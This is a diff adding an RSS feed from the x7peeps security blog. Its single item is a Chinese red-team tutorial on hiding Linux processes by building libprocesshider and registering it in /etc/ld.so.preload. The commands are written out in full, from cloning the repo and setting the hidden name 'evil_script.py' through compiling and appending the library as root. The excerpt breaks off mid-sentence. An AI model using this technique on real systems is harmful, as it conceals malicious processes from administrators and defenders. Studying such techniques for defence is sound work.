@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>进程隐藏,持久化,劫持lib on x7peeps</title>
+    <link>https://x7peeps.com/tags/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8C%81%E4%B9%85%E5%8C%96%E5%8A%AB%E6%8C%81lib/index.html</link>
+    <description>Recent content in 进程隐藏,持久化,劫持lib on x7peeps</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 20 Feb 2020 23:31:00 +0000</lastBuildDate><atom:link href="https://x7peeps.com/tags/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8C%81%E4%B9%85%E5%8C%96%E5%8A%AB%E6%8C%81lib/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>linux隐藏进程-预加载库或lib劫持</title>
+      <link>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/index.html</link>
+      <pubDate>Thu, 20 Feb 2020 23:31:00 +0000</pubDate>
+      <guid>https://x7peeps.com/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E5%AF%B9%E6%8A%97%E7%A0%94%E7%A9%B6/linux%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B-%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%BA%93%E6%88%96lib%E5%8A%AB%E6%8C%81/index.html</guid>
+      <description>劫持lib库 原理解析：利用环境变量LD_PRELOAD或者配置ld.so.preload文件使的恶意的动态库先于系统标准库加载，以达到架空系统标准库中相关函数的目的，最终实现对特定进程的隐藏。实现通过劫持lib库隐藏进程
+这里参考：
+https://github.com/gianlucaborello/libprocesshider ，英文教程
+https://www.anquanke.com/post/id/226285
+首先下载环境
+git clone git@github.com:gianlucaborello/libprocesshider.git cd libprocesshider-master自定义过滤函数
+编辑 processhider.c，根据需要过滤的程序名称，修改process_to_filter变量值。这里需要注意下，这里匹配的是程序运行时候显示的名字，如果要使用python运行的话，这里应该填写的是python，python3同理。这里填写evil_script.py那么执行的时候就应该使用./方式执行，这样程序名为evil_script.py才会匹配并过滤。
+...... /* * Every process with this name will be excluded */ static const char* process_to_filter = &amp;#34;evil_script.py&amp;#34;; ......配置环境
+parallels@ubuntu:~/Documents/libprocesshider-master$ make gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl parallels@ubuntu:~/Documents/libprocesshider-master$ sudo mv libprocesshider.so /usr/local/lib/ sudo -i 进入管理员权限 root@ubuntu:/home/parallels/Documents/libprocesshider-master# echo /usr/local/lib/libprocesshider.so &amp;gt;&amp;gt; /etc/ld.so.preload echo /usr/local/lib/libprocesshider.so &amp;gt;&amp;gt; /etc/ld.so.preload cat /etc/ld.so.preload 测试ps是否会访问预加载，发现是加载了。
+strace -f ps 2&amp;gt;&amp;amp;1 |grep ld.so.preload 这里注意需要./执行evil_script.py, 进程名才会被过滤，如果想使用python执行，那么前面****processhider.</description>
+    </item>
+  </channel>
+</rss>
